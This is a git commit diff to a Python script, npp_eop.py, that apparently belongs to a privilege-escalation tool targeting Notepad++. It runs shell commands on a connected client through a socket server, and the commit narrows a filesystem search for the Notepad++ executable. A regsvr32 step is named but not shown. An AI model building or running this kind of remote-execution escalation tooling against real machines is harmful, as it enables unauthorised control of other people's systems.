b0e93c2bfa05a281a749f19b897548a014f19c9f
Gustybobby <napattatiyakaroonwong@gmail.com>
2025-10-05 19:19:45 +0700

    scope npp dir to exe

--- npp_eop.py
+++ npp_eop.py
@@ -8,7 +8,7 @@ def find_npp_task(client: socket.socket):
 
 
 def find_npp_dir(client: socket.socket) -> str:
-    return server.call_exec(client, "where /r C:\\Users *npp*")
+    return server.call_exec(client, "where /r C:\\Users *npp*.exe")
 
 
 def send_regsvr32(client: socket.socket, dir: str):
